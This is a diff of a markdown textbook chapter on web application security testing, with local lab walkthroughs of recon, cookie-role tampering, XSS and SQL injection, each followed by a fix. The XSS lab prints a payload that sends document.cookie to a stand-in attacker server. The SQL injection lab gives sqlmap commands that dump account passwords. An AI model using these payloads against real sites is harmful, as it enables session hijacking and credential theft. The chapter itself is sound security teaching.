@@ -25,13 +25,14 @@ We might imagine that an untreated web application vulnerability could lead to t
 
 In the previous Web Application Defense chapter, we introduced the OWASP Top 10, which is a list of generalized and common web application risks.  The list outlines broad categories of risk and its supporting documentation describes examples of web application vulnerabilities associated with that risk.  It is a useful reference to categorize and prioritize the types of issues a web application has, but it does not provide a comprehensive mapping or description of all the vulnerabilities applications to which it could be exposed.  For example, number three on the 2021 OWASP Top 10 list is *injection*, which goes on to describe common injection attacks such as SQL and OS commands. [^1]  But there are many other injection attacks not mentioned that would be valuable to web application defenders.
 
-![[../images/09/cwe_command_injection.png|CWE Command Injection Page|600]]
 
-The MITRE project, *Common Weakness Enumeration (CWE)*, attempts to aggregate and correlate software vulnerabilities into a classification scheme in much richer detail than the generalized format OWASP Top 10 provides us.  The CWE library, which can be browsed at https://cwe.mitre.org/, is currently comprised of nearly one thousand weaknesses across software and hardware.  Each weakness is tracked using a unique ID with the syntax `CWE-##` and a title.  For example, CWE-77 `Improper Neutralization of Special Elements used in a command ('Command Injection')` screenshot is below. [^2]  
+The MITRE project, **Common Weakness Enumeration (CWE)**, attempts to aggregate and correlate software vulnerabilities into a classification scheme in much richer detail than the generalized format OWASP Top 10 provides us.  The CWE library, which can be browsed at https://cwe.mitre.org/, is currently comprised of nearly one thousand weaknesses across software and hardware.  Each weakness is tracked using a unique ID with the syntax `CWE-##` and a title.  For example, CWE-77 `Improper Neutralization of Special Elements used in a command ('Command Injection')` screenshot is below. [^2]  
 
 OWASP Top 10 maintainers attribute CWEs with each of the listed top 10 risk categories.  Within each CWE entry are verbose descriptions, other related CWEs and categories, technical impacts, detailed examples with code snippets, real world vulnerabilities discovered, and mitigation strategies to cure the weakness.  Security professionals in this space, such as Application Security Engineers or Web Application Penetration Testers, often reference the CWEs related to discovered vulnerabilities.  Referencing CWEs supports identified issues and streamlines conversations with other stakeholders such as managers or developers.  But the security professional wouldn't use the CWE database as a means to systematically test an application as it is not organized in a manner that is conducive to efficient testing.
 
-A security professional could use a testing framework designed in a natural flow to identify vulnerabilities.  A framework is almost like a checklist that supports a tester from missing classes of vulnerabilities they might otherwise forget by working off their infallible memory.  One great resource that attempts to organize such testing efforts is the *OWASP Web Security Testing Guide (WSTG)* available at https://owasp.org/www-project-web-security-testing-guide/stable/.  This is another open-source and free resource sponsored by the OWASP Foundation.  The first few sections of the guide introduce secure development practices and instructions on how to use the guide.  Of particular interest is section 4, Web Application Security Testing, that outlines many web application attack vectors in a logical order.  Major subsections of section 4 include the following:
+![[../images/09/cwe_command_injection.png|CWE Command Injection Page|650]]
+
+A security professional could use a testing framework designed in a natural flow to identify vulnerabilities.  A framework is almost like a checklist that supports a tester from missing classes of vulnerabilities they might otherwise forget by working off their infallible memory.  One great resource that attempts to organize such testing efforts is the **OWASP Web Security Testing Guide (WSTG)** available at https://owasp.org/www-project-web-security-testing-guide/stable/.  This is another open-source and free resource sponsored by the OWASP Foundation.  The first few sections of the guide introduce secure development practices and instructions on how to use the guide.  Of particular interest is section 4, Web Application Security Testing, that outlines many web application attack vectors in a logical order.  Major subsections of section 4 include the following:
 
 - Information Gathering
 - Configuration and Deployment Management Testing
@@ -48,7 +49,7 @@ A security professional could use a testing framework designed in a natural flow
 
 Each of these subsections are further broken down into yet further subsections that are tailored to specific attack vectors.  Continuing with our earlier command injection topic, which was identified in the OWASP Top 10 and the CWE, is the WSTG's subsection 4.7.12 Testing for Command Injection. [^3] The WSTG entry for command injection provides an overall summary, testing instructions which include the technical details and malicious payloads to attempt, as well as recommended remediation steps.  Unlike CWE which categorizes and supports the type of vulnerability, WSTG entries give detailed testing instructions on how to approach the discovery of the vulnerability.
 
-![[../images/09/wstg_command_injection.png|WSTG Testing for Command Injection Page]]
+![[../images/09/wstg_command_injection.png|WSTG Testing for Command Injection Page|650]]
 
 The remainder of this chapter will explore the practical demonstration of web application security vulnerabilities.  It will not be comprehensive and interested readers are encouraged to explore the mentioned resources to learn more about this risky and highly-in-demand information security sub-discipline.
 ## Application Discovery
@@ -91,7 +92,7 @@ Once an attacker has a target domain, they can use search engines to discover ot
 site:yahoo.com
 ```
 
-![[../images/09/yahoo_search.png|Google Dork Yahoo Site|750]]
+![[../images/09/yahoo_search.png|Google Dork Yahoo Site|600]]
 
 The first couple of results show `login.yahoo.com` and `fr.yahoo.com` subdomains, and then there are some 109 million additional pages.  As I am trying to compile a list of all the subdomains Yahoo has, I note these first two and then exclude them from my subsequent queries using the minus character.
 
@@ -99,17 +100,16 @@ The first couple of results show `login.yahoo.com` and `fr.yahoo.com` subdomains
 site:yahoo.com -site:login.yahoo.com -site:fr.yahoo.com
 ```
 
-![[../images/09/yahoo_subdomains.png|Refining Dork to Exclude Select Subdomains|650]]
+![[../images/09/yahoo_subdomains.png|Refining Dork to Exclude Select Subdomains|600]]
 
 The next two subdomains are `shopping.yahoo.com` and `finance.yahoo.com` and the total results are now about 86 million.  Not bad eliminating 23 million records!  I add shopping and finance to my growing list of discovered subdomains for Yahoo and repeat the process until I have exhausted all Google results.  You might be thinking that this task could be automated, and you would be right!  Check out the `Sublist3r` tool by aboul3la on GitHub. [^6]   This open-source tool, written in Python, scrapes search engines for a given domain and returns a list of subdomains.  Be aware that, as Google is quite good at detecting and thwarting automated scans such as these by placing CAPTCHAs in responses.
 
->[!info] Info - OSINT
->*Open-source intelligence (OSINT)* is the passive reconnaissance technique of using available information on a target, usually on the internet or public sources.  Many of the activities discussed in this section are OSINT techniques, although there are many more that are not covered in this chapter.
+![[../images/09/crt_sh.png|Crt.sh Query for Google Subdomains|600]]
 
 There are other methods to discover subdomains on a target.  One of my favorite sites is `crt.sh` which gathers TLS certificate information on domains and compiles it into a searchable online database.  Due to *certificate transparency*, the certificate may list all subdomains that the certificate is valid for.  This listing can be collected as yet another source to compile a list of domain targets.  The following screenshot is taken from crt.sh after querying for "google.com".  It returns a long list of Google subdomains!
 
-![[../images/09/crt_sh.png|Crt.sh Query for Google Subdomains|500]]
-
+>[!info] Info - OSINT
+>*Open-source intelligence (OSINT)* is the passive reconnaissance technique of using available information on a target, usually on the internet or public sources.  Many of the activities discussed in this section are OSINT techniques, although there are many more that are not covered in this chapter.
 ## Web Attacks
 Many types of web application attacks that can lead to the compromise of accounts, systems, and data have been identified by the security community.  Successful exploitation of web vulnerabilities could even serve as the beachhead from where additional attacks against a network are waged.  This section will not cover all categories of web application attacks, but will instead cover a few common vulnerabilities, their exploitation, and how to mitigate them.
 ### Directory Busting
@@ -142,7 +142,7 @@ Take the example of a file named `backup.sql` or `staging.zip`.  It is imaginabl
 >```
 >![[../images/09/bust_activity_db_run.png|Setting Up Database on Container|600]]
 >Everything should be set up, so I test the application by launching Firefox and navigating to http://127.0.0.1/.
->![[../images/09/bust_activity_app_test.png|Vulnerable Site Application Running in Browser|300]]
+>![[../images/09/bust_activity_app_test.png|Vulnerable Site Application Running in Browser|450]]
 >I shift focus now to attacking this vulnerable-site.  I hope to find valuable information that could help me log into the application.  The first step many attackers take after finding a target site is to map the application and hunt for exposed pages or files.  I will use Gobuster for my directory busting activity, but I first need to install it.
 >```bash
 >sudo apt install gobuster -y
@@ -165,13 +165,13 @@ As described in the Web Applications Defense chapter, HTTP is a stateless protoc
 
 Web applications can be configured to establish a **session** when a user requests a page.  The session is a file stored on the web server, or as data in a caching server, that will contain information related to the user of the site.  Session files are named or identified by a long and random string to ensure that no two session identifiers collide.  The developers of the web application can store any information they wish within the session, such as specific user information like an access role or if the user has been authenticated.  Storing information within the session ensures security as the data within the session file can only be updated by the application and not the user directly.
 
-Web applications that use sessions will respond to user requests with the *Set-Cookie* header that contains the name and value of a cookie.  A cookie is a piece of data that is stored on the client's computer and accessible by the client's browser.  The name of the cookie could be anything meaningful to the application, but an example could be "access-token" or "SESSID".  The value of this cookie would be the session identifier, that long and random string that is used to identify the session file on the web server.  Additional requests to the web application from the client will automatically include the *Cookie* header that includes the cookie name and value.  This is how the client and the web server can retain information between requests and responses, such as user log on status and permissions.  
+Web applications that use sessions will respond to user requests with the *Set-Cookie* header that contains the name and value of a cookie.  A **cookie** is a piece of data that is stored on the client's computer and accessible by the client's browser.  The name of the cookie could be anything meaningful to the application, but an example could be "access-token" or "SESSID".  The value of this cookie would be the session identifier, that long and random string that is used to identify the session file on the web server.  Additional requests to the web application from the client will automatically include the *Cookie* header that includes the cookie name and value.  This is how the client and the web server can retain information between requests and responses, such as user log on status and permissions.  
 
 ![[../images/09/cookie_session_diagram.png|Cookie and Session Handling|450]]
 
 The diagram above illustrates the concept of a session and cookie used to store authentication information.  Assuming the client has visited and logged into a site previously, they submit a cookie "token=123abc" to the web server.  The web application looks up the session 123abc's "logged_in" value and confirms that the user's state is True or logged in.  The application then responds with the request page and data since the user was authenticated.  As long as the client submits a valid cookie, the web application looks up the session file on the web server and identifies that the user is logged in and allowed to request the page or data before returning an appropriate response.  If the user submits a request for an authenticated page without a valid cookie, then the web application would respond with an access denied, or equivalent, response.
 
-Protecting web server session files is an integral part of securing web applications.  Weaknesses in this area would undermine web application account security which is a significant concern.  Session identifiers, which are used as cookie values client side, should be long and have high entropy.  The randomness of the value protects the session from being guessed, calculated, or brute-forced.  The web server, or system storing session information, should be well protected by applying least privileged access to the session files.  The web application must avoid *business logic flaws* or bugs that allow the bypassing of authentication and authorization controls that rely on sessions.  A common example of this is relying on a cookie value as an indicator of authentication or authorization state.  For instance, imagine an application that sets a cookie called "role" with a value of "user" and relies on the value when determining if a request is authorized to access a page or data.  An attacker could abuse this vulnerability by changing the cookie value to "administrator" and submitting a request to gain unauthorized access to pages or data low privileged to which users do not have access.  This vulnerability could be avoided by storing authorization states within a session file on the server side and not as a client-side cookie.
+Protecting web server session files is an integral part of securing web applications.  Weaknesses in this area would undermine web application account security which is a significant concern.  Session identifiers, which are used as cookie values client side, should be long and have high entropy.  The randomness of the value protects the session from being guessed, calculated, or brute-forced.  The web server, or system storing session information, should be well protected by applying least privileged access to the session files.  The web application must avoid **business logic flaws** or bugs that allow the bypassing of authentication and authorization controls that rely on sessions.  A common example of this is relying on a cookie value as an indicator of authentication or authorization state.  For instance, imagine an application that sets a cookie called "role" with a value of "user" and relies on the value when determining if a request is authorized to access a page or data.  An attacker could abuse this vulnerability by changing the cookie value to "administrator" and submitting a request to gain unauthorized access to pages or data low privileged to which users do not have access.  This vulnerability could be avoided by storing authorization states within a session file on the server side and not as a client-side cookie.
 
 Client-side cookies used for sensitive operations such as storing users' authentication and authorization states, must also be protected.  If a client-side cookie is obtained by an attacker, they would be able to use it to access the web application as the user.  This means that the attacker would not need to know the victim's password, also bypassing any multi-factor authentication security, and could navigate the web application without scrutiny.  Some web applications require that sensitive operations, like bank transfers or changing email addresses, re-authenticate to mitigate the risk of a victim's cookie being compromised.  The major browser developers have embedded security attributes to the *cookie jar*, where all cookies are stored on the client browser, that protect the cookie from attack.
 
@@ -203,14 +203,14 @@ As you can tell, not all cookies need protection and several of the cookies from
 > With the container restarted, I open Firefox, navigate to http://127.0.0.1/, and login with the low privilege user `daniel` whose password is `Password123` where I am directed to the Welcome Page.
 > ![[../images/09/activity_authz_login.png|Low Privilege Login Welcome Page|600]]
 > Logged in as the low privileged user, I press the "Admin Page" link on the Welcome Page and get an UNAUTHORIZED message.
-> ![[../images/09/activity_authz_unauth.png|Unauthorized Admin Page Request|600]]
+> ![[../images/09/activity_authz_unauth.png|Unauthorized Admin Page Request|700]]
 > 
 > While logged in, I open the developer tools (F12) and enumerate the available cookies.  Firefox is a little different than Edge where the cookies are under the Storage tab.
 > ![[../images/09/cookie_activity_enum.png|Developer Console Cookies]]
 > I see there is a PHPSESSID cookie which is the default session cookie used with PHP applications.  If an attacker were to obtain that cookie value, they could impersonate my user in the vulnerable application.  Another cookie that draws my attention is the cookie called "role" which has a value of "user".  Perhaps the Vulnerable Site uses this cookie value to direct users to pages that require elevated privileges.  To test this, I change the cookie value by double clicking its value field, typing "administrator", and then hitting enter.  
-> ![[../images/09/cookie_activity_modify.png|Modifying Role Cookie to Administrator|450]]
+> ![[../images/09/cookie_activity_modify.png|Modifying Role Cookie to Administrator|600]]
 > I refresh the page and see that I am presented with the Admin Page!
-> ![[../images/09/activity_authz_admin_hack.png|Escalated Privileges and Revealed Admin Page|600]]
+> ![[../images/09/activity_authz_admin_hack.png|Escalated Privileges and Revealed Admin Page|700]]
 > Let us explore where this vulnerability was introduced into the application source code and how to fix it.  Navigating to the vulnerable site repository and the app folder, I can open the `index.php` page using Nano.
 > ```bash
 > cd vulnerable-site/app
@@ -220,11 +220,11 @@ As you can tell, not all cookies need protection and several of the cookies from
 > The index.php page contains the source code for the login page.  About halfway down I see that the PHP function `setcookie` is used to create the role cookie with the supplied variable from the MySQL Users table. 
 > ![[../images/09/cookie_activity_setcookie.png|Vulnerable SetCookie Function On Index.php|600]]
 > The magic variable `$_SESSION` is used to store data within a session server side.  I update the vulnerable line to `$_SESSION['role'] = $role;` to avoid exposing the role setting to a user-controlled cookie.  I press CTRL+X and answer yes to save the file.
-> ![[../images/09/cookie_activity_index_session.png|Replacing SetCookie With $_SESSION|550]]
+> ![[../images/09/cookie_activity_index_session.png|Replacing SetCookie With $_SESSION|500]]
 > This fixes the application to not set the cookie, but the server still relies on the cookie when a user visits the authenticated Admin Page.  Investigating the `admin.php` file shows an "if" statement that uses the magic variable `$_COOKIE` for the role cookie.
-> ![[../images/09/activity_authz_admin_page.png|Admin Page Cookie Vulnerability|600]]
+> ![[../images/09/activity_authz_admin_page.png|Admin Page Cookie Vulnerability|500]]
 > This magic variable relies on cookie "role" and needs to instead reference the session file on the server.  To fix it, and ensure that the application still works, I update the line to `if($_SESSION['role'] == 'administrator') {`. 
-> ![[../images/09/activity_authz_admin_fix.png|Fixing Admin Page to Use $_SESSION|600]]
+> ![[../images/09/activity_authz_admin_fix.png|Fixing Admin Page to Use $_SESSION|500]]
 > After saving the file, I restart the browser and login using the low privileged `daniel` user.  Navigating back to the developer tools I see that the role cookie is no longer available!
 > ![[../images/09/activity_authz_fixed.png|Role Cookie Removed|600]]
 ### Client Scripting
@@ -235,13 +235,13 @@ Any system that runs, or executes, code has an interest to security because a vu
 > [!tip] Tip - JavaScript Everywhere
 > Technically, XSS vulnerabilities can be found anywhere that JavaScript is able to run, which is not just the browser.  For example, many backend web servers now run JavaScript via NodeJS and many Microsoft Windows applications support scripting via Windows Script Host using JScript.  Even a PDF can run JavaScript!
 
-There are at least three forms of XSS vulnerabilities.  *Reflected* XSS requires the participation of the victim, usually by clicking on a link to a vulnerable web application with an embedded malicious JavaScript payload.  *Stored* XSS is more dangerous as the attacker is able to supply the malicious payload to the web application in advance where it is stored and later retrieved by the victim after visiting a page on the site.  *DOM-based* XSS take advantage of embedding JavaScript within the browser's DOM and can be reflected or stored.  There is a less common fourth XSS vulnerability known as the *self* XSS where a user is socially engineered to run malicious JavaScript in their developer tools console.  Any of the three common XSS vulnerabilities always start with a source which is the user supplied input and end with a sink where the code is eventually rendered out within the browser by the victim.
+There are at least three forms of XSS vulnerabilities.  *Reflected* XSS requires the participation of the victim, usually by clicking on a link to a vulnerable web application with an embedded malicious JavaScript payload.  *Stored* XSS is more dangerous as the attacker is able to supply the malicious payload to the web application in advance where it is stored and later retrieved by the victim after visiting a page on the site.  *DOM-based* XSS take advantage of embedding JavaScript within the browser's DOM and can be reflected or stored.  There is a less common fourth XSS vulnerability known as the *self* XSS where a user is socially engineered to run malicious JavaScript in their developer tools console.  Any of the three common XSS vulnerabilities always start with a **source** which is the user supplied input and end with a **sink** where the code is eventually rendered out within the browser by the victim.
 
-To protect against these vulnerabilities, web application developers must ensure to validate untrusted inputs.  This work must be conducted server side as any client-side validation efforts can be easily circumvented since anything coming from the client can be manipulated.  Untrusted input can be any value that is received from the client, such as headers and parameters, or values received from other systems, such as databases or third-party APIs.  There are a few methods of validating input with varying degrees of effectiveness.  The best method is to deny all and then allow by exception, called *allowlisting* method or *whitelisting*.  In this approach, all input is assumed to be invalid unless it matches provided criteria, such as character length, allowed characters, or keywords.  This is the best input validation method that will provide the most risk mitigation, unless that validation allows for characters needed for an XSS payload like `", >, <, '` and others.  Alternatively, the *blocklisting* method, also known as the *blacklist*, can provide some mitigation capabilities by assuming all inputs are allowed unless they match a list of invalid characters or strings.  This is a risky undertaking as there are many ways creative attackers could encode their payloads to avoid the filter.  Regardless of the method chosen, seemingly safe input is passed along to the application and unsafe input is blocked, usually informing the user with an error.
+To protect against these vulnerabilities, web application developers must ensure to validate untrusted inputs.  This work must be conducted server side as any client-side validation efforts can be easily circumvented since anything coming from the client can be manipulated.  Untrusted input can be any value that is received from the client, such as headers and parameters, or values received from other systems, such as databases or third-party APIs.  There are a few methods of validating input with varying degrees of effectiveness.  The best method is to deny all and then allow by exception, called *allowlisting* method or *whitelisting*.  In this approach, all input is assumed to be invalid unless it matches provided criteria, such as character length, allowed characters, or keywords.  This is the best **input validation** method that will provide the most risk mitigation, unless that validation allows for characters needed for an XSS payload like `", >, <, '` and others.  Alternatively, the *blocklisting* method, also known as the *blacklist*, can provide some mitigation capabilities by assuming all inputs are allowed unless they match a list of invalid characters or strings.  This is a risky undertaking as there are many ways creative attackers could encode their payloads to avoid the filter.  Regardless of the method chosen, seemingly safe input is passed along to the application and unsafe input is blocked, usually informing the user with an error.
 
-I have often heard input validation and sanitization being used interchangeably, but there is a technical difference.  The last input validation control is called *sanitization* in which keywords or characters are removed from an input and then the remaining value is passed along to the application.  This method suffers from the same issue as blocklisting as the engineer assumes they will be able to capture all malicious characters and strings, which is unlikely.  Many developers prefer this approach as it enhances the user experience by avoiding having to provide a user with an error message and removes friction.  However, the sanitization of inputs would likely cause issues later when the application uses that modified data.  If sanitization is used, it must be recursively applied where the input is reinspected after the initial sanitization check until no more abusive characters or strings remain.  Otherwise, an attacker could provide a nested malicious string such as `<s<script>ript>` where the sanitization logic will remove the `<script>` tag, concatenate the remaining value producing `<script>`, and pass it along to the vulnerable web application.
+I have often heard input validation and sanitization being used interchangeably, but there is a technical difference.  The last input validation control is called **sanitization** in which keywords or characters are removed from an input and then the remaining value is passed along to the application.  This method suffers from the same issue as blocklisting as the engineer assumes they will be able to capture all malicious characters and strings, which is unlikely.  Many developers prefer this approach as it enhances the user experience by avoiding having to provide a user with an error message and removes friction.  However, the sanitization of inputs would likely cause issues later when the application uses that modified data.  If sanitization is used, it must be recursively applied where the input is reinspected after the initial sanitization check until no more abusive characters or strings remain.  Otherwise, an attacker could provide a nested malicious string such as `<s<script>ript>` where the sanitization logic will remove the `<script>` tag, concatenate the remaining value producing `<script>`, and pass it along to the vulnerable web application.
 
-While input validation deals with the vulnerability at the source, *output encoding* mitigates the risk at the sink.  The objective of output encoding is to render the input in a safe manner that will not be interpreted or executed by the client.  It does this by converting special characters into a safe encoding scheme and most languages have built-in functions that will perform this task.  Technically, XSS is due to improper handling of output, although mitigating the risk at the source and the sink ensures the most protection.
+While input validation deals with the vulnerability at the source, **output encoding** mitigates the risk at the sink.  The objective of output encoding is to render the input in a safe manner that will not be interpreted or executed by the client.  It does this by converting special characters into a safe encoding scheme and most languages have built-in functions that will perform this task.  Technically, XSS is due to improper handling of output, although mitigating the risk at the source and the sink ensures the most protection.
 
 >[!activity] Activity 9.5 - Cross-Site Scripting
 >Our Vulnerable Site container used in the last couple of activities also has a cross-site scripting vulnerability.  I will explore the discovery and exploitation of this vulnerability using the Kali VM.  Afterwards, I will demonstrate how to fix the underlying issue and validate the vulnerability's mitigation.
@@ -249,11 +249,11 @@ While input validation deals with the vulnerability at the source, *output encod
 >Once the Kali VM is started and the Vulnerable Site is running, I launch Firefox, navigate to http://127.0.0.1/ and open the page's source by right clicking and selecting View Page Source.  Within the page source, I observe an HTML form with a hidden input named version with a value of beta.  This is one method web applications use to transfer data between requested pages.
 >![[../images/09/xss_activity_source.png|View Source of Vulnerable Site Index Page|550]]
 >I return to the login page and enter the low privileged username `daniel` and password `Password123` which places me at the Welcome Page.  The page includes a footer with the content "Version: beta" and I can also see that the URL has a GET parameter version with a value of beta.  
->![[../images/09/activity_xss_welcome.png|Welcome Page Version Rendering|600]]
+>![[../images/09/activity_xss_welcome.png|Welcome Page Version Rendering|500]]
 >It appears this page is rendering the GET parameter value.  To test this idea, I change the value `beta` to `foobar` and reload the page.  The footer is updated with arbitrary values!
->![[../images/09/activity_xss_foobar.png|Changing Version Parameter|600]]
+>![[../images/09/activity_xss_foobar.png|Changing Version Parameter|500]]
 >Even though I am able to change the value, it does not indicate a vulnerability.  There could be input validation or output encoding protections that I will not know until I have tested them by trying other payloads.  One common XSS payload test is `<script>alert('xss')</script>` which is simple JavaScript that executes an alert box.  Using this benign payload demonstrates the ability to execute arbitrary code in a clear manner.  These demonstrations are sometimes called *proof of concepts (PoC)*.  I try the XSS test payload by replacing the `foobar` value in the version parameter and reload the page.  This time, an alert box is presented which demonstrates an XSS vulnerability!
->![[../images/09/activity_xss_poc.png|XSS POC|600]]
+>![[../images/09/activity_xss_poc.png|XSS POC|550]]
 >This is usually enough evidence to recommend that a development team fix the vulnerability.  However, an attacker could go much further, such as by stealing a user's access cookie.  In the previous section we describe the importance of cookie security and when absent, leaves the cookie vulnerable to theft.  Opening the developer tools, navigating to the Storage tab and selecting the site shows that the `PHPSESSID` token does not have the `HttpOnly` attribute set.  This means that JavaScript is permitted by the browser to interact with the cookie.
 >![[../images/09/xss_activity_cookie_review.png|PHPSESSID Cookie Security Check]]
 >I can chain the cookie and XSS vulnerabilities into an exploit to steal the PHPSESSID cookie value.  Knowing the cookie value empowers an attacker to use the web application as the victim user.  I modify the previous alert box payload with `<script>var i=new Image;i.src="http://127.0.0.1:9001/?"+document.cookie;</script>` which references an image whose source is 127.0.0.1 on port 9001.  You can imagine replacing this IP address with one in the attacker's control, but since I am performing this demonstration on my local Kali VM, I will just use port 9001 as the attacker's server.  The source request includes a parameter value that references the cookie storage.  When a victim user follows a link with the embedded XSS payload for the Vulnerable Site, they will inadvertently send their cookies to an attacker-controlled server.  
@@ -315,38 +315,81 @@ This vulnerable line of code takes GET parameters and concatenates them into a q
 > ```bash
 > sqlmap -u ' http://127.0.0.1/?username=lol&password=lol&version=beta' --batch
 > ```
-> ![[../images/09/sqli_activity_initial_map.png|Initial SQLMap Scan of Index Page|550]]
-> After a few moments, `SQLMap` finds that the username parameter is vulnerable to time-based blind SQL injection and the backend DBMS is MySQL.
-> ![[../images/09/sqli_activity_timebased.png|SQLMap Initial Results|550]]
-> I rerun the same `SQLMap` command using the `--dbs` option to identify what databases are within this MySQL DBMS.  `SQLMap` picks up where it left off and automatically uses the time-based blind injection vulnerability to extract the database names.  The time-based method is very slow as `SQLMap` has to guess each letter of every database name one at a time.  If the application responds slowly, it indicates whether the guessed letter is correct or not and then continues guessing the next letter until all database names are uncovered.
+> ![[../images/09/sqli_activity_initial_map.png|Initial SQLMap Scan of Index Page|500]]
+> 
+> ![[../images/09/sqli_activity_timebased.png|SQLMap Initial Results|500]]
+> After a few moments, `SQLMap` finds that the username parameter is vulnerable to time-based blind SQL injection and the backend DBMS is MySQL.  I rerun the same `SQLMap` command using the `--dbs` option to identify what databases are within this MySQL DBMS.  `SQLMap` picks up where it left off and automatically uses the time-based blind injection vulnerability to extract the database names.  The time-based method is very slow as `SQLMap` has to guess each letter of every database name one at a time. 
 > ```bash
 > sqlmap -u ' http://127.0.0.1/?username=lol&password=lol&version=beta' --batch --dbs
 > ```
-> ![[../images/09/sqli_activity_dbs.png|Dumping Databases Using SQLMap|550]]
+> ![[../images/09/sqli_activity_dbs.png|Dumping Databases Using SQLMap|500]]
 > After a few minutes, all database names are presented.  The schema, `mysql`, and `sys` databases are default databases used by MySQL to organize databases.  The `information_schema` database has a table where all the databases and tables are listed, which is what `SQLMap` uses to find the database names.  I see a database named company that looks interesting.
 > ![[../images/09/sqli_activity_dbs_results.png|Discovered Databases by SQLMap|500]]
 > To explore the tables within the company database I specify `-D company` and the `--dump` option.
 > ```bash
 > sqlmap -u ' http://127.0.0.1/?username=lol&password=lol&version=beta' --batch -D company --dump
 > ```
-> ![[../images/09/sqli_activity_tables.png|Dumping Table Names From Company Database|550]]
+> ![[../images/09/sqli_activity_tables.png|Dumping Table Names From Company Database|500]]
 > After a few minutes of SQL injections, SQLMap dumps the contents of the tables in the company database that includes usernames and passwords for all the accounts!
-> ![[../images/09/sqli_activity_user_dump.png|Users Table Dumped By SQLMap|550]]
+> ![[../images/09/sqli_activity_user_dump.png|Users Table Dumped By SQLMap|500]]
 
-The SQLi vulnerabilities can be mitigated by using input validation techniques covered in the XSS section of this chapter.  However, it is not advisable to rely on input validation as sometimes the data needing to be passed into the RDMBS will require the use of valid SQL syntax.  Instead, queries should be crafted by web applications in a safe manner to ensure that user input will not be executed as part of the query.  The standard method of doing so is through *prepared statements*, which replace concatenated strings with question marks, while encoded variable values replace them while processing requests.  Major web programming languages have this functionality built-in, so developers are encouraged to use it rather than over relying on input validation.
+The SQLi vulnerabilities can be mitigated by using input validation techniques covered in the XSS section of this chapter.  However, it is not advisable to rely on input validation as sometimes the data needing to be passed into the RDMBS will require the use of valid SQL syntax.  Instead, queries should be crafted by web applications in a safe manner to ensure that user input will not be executed as part of the query.  The standard method of doing so is through **prepared statements**, which replace concatenated strings with question marks, while encoded variable values replace them while processing requests.  Major web programming languages have this functionality built-in, so developers are encouraged to use it rather than over relying on input validation.
 ### Web Proxy Tooling
 The ability to capture inbound and outbound web traffic to inspect, modify and forward enables security researchers, attackers, and interested parties to examine how web applications operate between their web servers and clients.  These **web proxy tools**, installed client-side, use the browser's proxy settings to direct traffic through the tool.  They can be configured to even intercept TLS traffic by importing the proxying tool's certificate into the browser.
 
 The most popular tools are PortSwigger's Burp Suite and OWASP's ZAP.  Burp Suite's community edition has many free features such as intercept, automations like brute forcing, and repeater, which allows for the quick resending of requests.  Burp Suite's Pro edition costs around $400 per year and removes built in throttles, includes a fantastic DAST scanner, web spider, and other features.  ZAP has these features all for free, but the interface is less appealing, at least in my opinion.  
 
+Kali Linux has Burp Suite and ZAP preinstalled and can be launched from the applications menu.  Once the tool is started you can launch the built-in Chromium based browser *Burp browser* that already has the TLS certificate imported and is configured to run through the proxy tool.  Navigate to Target (tab), Site Map (sub tab) and press the Open Browser (button) to start a browser instance.  Opening a web site in the Burp browser starts capturing traffic that is logged and can be later analyzed.  The image below shows Burp browser on the right and the Burp Suite interface on the left.  The Burp Suite window displays captured requests and response in the bottom panes. 
+
+![[../images/09/burp_proxy.png|BurpSuite Intercepting Traffic|800]]
+
+
 > [!tip] Tip - Free Web Application Security Labs
 > Another service PortSwigger provides is their Academy, which has over one hundred free web application penetration testing labs that include a wide array of vulnerability classes spanning various difficulties.  The Academy even tracks your progress and is gamified with a leaderboard.  Readers interested in resources to practice their web application security skills should invest time in PortSwigger's Academy.  See https://portswigger.net/web-security for details.
 
-Kali Linux has Burp Suite and ZAP preinstalled and can be launched from the applications menu.  Once the tool is started you can launch the built-in Chromium based browser *Burp browser* that already has the TLS certificate imported and is configured to run through the proxy tool.  Navigate to Target (tab), Site Map (sub tab) and press the Open Browser (button) to start a browser instance.  Opening a web site in the Burp browser starts capturing traffic that is logged and can be later analyzed.  The image below shows Burp browser on the right and the Burp Suite interface on the left.  The Burp Suite window displays captured requests and response in the bottom panes. 
-
-![[../images/09/burp_proxy.png|BurpSuite Intercepting Traffic]]
-
 These captured requests can be modified and replayed through the Repeater and Intruder features.  There are numerous features worth exploring on how to use Burp, along with a robust community that extends its capabilities through downloadable add-on extensions from the marketplace.  Anyone doing web application security testing is likely using a web proxy, such as ZAP or Burp, as they are very powerful tools that enrich the testing experience.
+
+## Summary
+This chapter walked through the lifecycle of web-application security testing, beginning with an overview of internet-exposed risks and the value of resources like the OWASP Top 10, CWE, and WSTG for framing security tests and assessments.  We then explored passive reconnaissance using search engines, Google dorks, tools like Sublist3r or crt.sh to uncover hidden endpoints and subdomains, and active mapping via directory busting with Gobuster.  Next, we delved into session management and cookies, demonstrating how misconfigurations like client-side “role” cookies and HttpOnly/SameSite settings impact authentication integrity.  We covered JavaScript injection vectors and the three main XSS types (reflected, stored, DOM-based), followed by SQL injection in RDBMS environments and the importance of prepared statements.  Finally, we introduced web proxy tools such as Burp Suite and ZAP for traffic interception and automated scanning and pointed readers toward hands-on practice at PortSwigger’s Academy to solidify these concepts.
+
+>[!terms] Key Terms
+>**Business Logic Flaws** - Errors in an application’s design or workflow that allow attackers to bypass intended security controls or manipulate processes in unintended ways.
+>
+>**Common Weakness Enumeration (CWE)** - A community-driven catalog of software and hardware weaknesses, each identified by a unique CWE-ID and detailed with descriptions, examples, and mitigation guidance.
+>
+>**Cookie** - A small piece of data stored by the browser in its cookie storage that carries stateful information, such as session identifiers, between the client and the web server.
+>
+>**Cross-site Scripting (XSS)** - A code injection vulnerability in which an attacker’s malicious script is injected into a web page and executed in the victim’s browser context.
+>
+>**Directory Busting** - The process of using a wordlist to guess and enumerate hidden directories or files on a web server by examining HTTP responses.
+>
+>**Google Dork** - An advanced search query using specialized operators to uncover sensitive or hidden information indexed by search engines.
+>
+>**Input Validation** - The practice of verifying and enforcing that all external or user-supplied data conforms to expected formats and rules before processing.
+>
+>**Output Encoding** - The technique of converting special characters in data into a safe representation to prevent that data from being interpreted or executed by the client.
+>
+>**OWASP Web Security Testing Guide (WSTG)** - A comprehensive, open-source guide that outlines systematic methodologies and test cases for assessing web application security.
+>
+>**Prepared Statements** - A database query mechanism that separates SQL code from data by using placeholders, ensuring user input cannot alter the intended query structure.
+>
+>**Relational Database Management Systems (RDBMS)** - Software systems that store data in structured tables with defined relationships and enforce integrity via a relational schema.
+>
+>**Sanitization** - The process of removing or escaping dangerous characters or patterns from input to neutralize potential attacks before further handling.
+>
